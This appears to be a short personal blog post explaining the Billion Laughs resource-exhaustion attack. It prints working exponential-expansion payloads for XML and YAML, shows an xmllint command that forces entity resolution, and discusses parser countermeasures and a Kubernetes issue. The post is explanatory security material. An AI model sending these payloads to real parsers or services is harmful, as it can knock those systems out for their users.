---
layout: post
title: Billion Laughs Attack examples
date: 2020-12-03 08:37:49
---
![lololol](/assets/images/3ujp7rhznmid96gfxl5y.gif)

[Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack) are a type of **DDoS attack** :skull:, initially targetting the **XML** documents and parsers.

## XML lol will make you cry
This is the most common example of **XML Billions Laughs Attack** :

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
 <!ENTITY lolz "&lol9;">
]>
<root>&lolz;</root>
```

This attack is well known and several countermeasures are in place in parsers.

If you check one major **XML parsing library**, `libxml` (and by extension `xmllint`) is obviously not longer sensitive to this threat.

First there is check for reference loops so `xmllint` will return you an error:

```
Entity: line 1: parser error : Detected an entity reference loop
```

Second, the `resolving of entities` was years ago disabled by default.

But if you want to try, you can do something like (force dangerous mode explicitely with `--noent`):

```bash
xmllint lolz.xml --noent
```

(with a reduced set of entities to bypass the reference loop)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lolz "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
]>
<root>lollollollollollollollollollol</root>
```


## YAML laughs out loud
`XML` is not the only language impacted by this problem, 
every markup language with reference support is sensitive the same way to this potential DDoS attack.

There is a "billion laughs attack' in YAML :

```yaml
lol1: &lol1 ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
lol2: &lol2 [*lol1,*lol1,*lol1,*lol1,*lol1,*lol1,*lol1,*lol1,*lol1]
lol3: &lol3 [*lol2,*lol2,*lol2,*lol2,*lol2,*lol2,*lol2,*lol2,*lol2]
lol4: &lol4 [*lol3,*lol3,*lol3,*lol3,*lol3,*lol3,*lol3,*lol3,*lol3]
lol5: &lol5 [*lol4,*lol4,*lol4,*lol4,*lol4,*lol4,*lol4,*lol4,*lol4]
lol6: &lol6 [*lol5,*lol5,*lol5,*lol5,*lol5,*lol5,*lol5,*lol5,*lol5]
lol7: &lol7 [*lol6,*lol6,*lol6,*lol6,*lol6,*lol6,*lol6,*lol6,*lol6]
lol8: &lol8 [*lol7,*lol7,*lol7,*lol7,*lol7,*lol7,*lol7,*lol7,*lol7]
lol9: &lol9 [*lol8,*lol8,*lol8,*lol8,*lol8,*lol8,*lol8,*lol8,*lol8]
lolz: &lolz [*lol9]
```

And for the anecdote, **Kubernetes** was very recently [impacted by this](https://github.com/kubernetes/kubernetes/issues/83253) !

## Details
What is the problem with this exactly ? 

I mean, whatever the language you could produce malicious (or dumb) code that will consume all stack, memory, resources...

The problem here is that XML and YAML are formats intended to store datas but with **programming capabilities** (the references).

Everybody agree that if you let an user enter some python code to be executed as is on server side, it is dangerous. But when it comes to process XML or YAML, processing (parsing) seems "safe" where it is sometimes not.

The threat then comes that we seems to exchange inoffensive data where user can actually hide function calls (and system reads ! but we do not discussed XXE attacks :smile:).


